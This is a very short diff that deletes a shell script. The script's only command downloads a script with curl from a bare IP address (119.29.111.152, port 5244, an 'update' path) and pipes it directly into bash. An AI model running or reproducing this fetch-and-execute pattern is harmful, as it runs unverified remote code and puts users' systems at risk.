@@ -1,3 +1,0 @@
-#/bin/bash
-
-bash <(curl -Lso- http://119.29.111.152:5244/d/update/x86_app.sh)
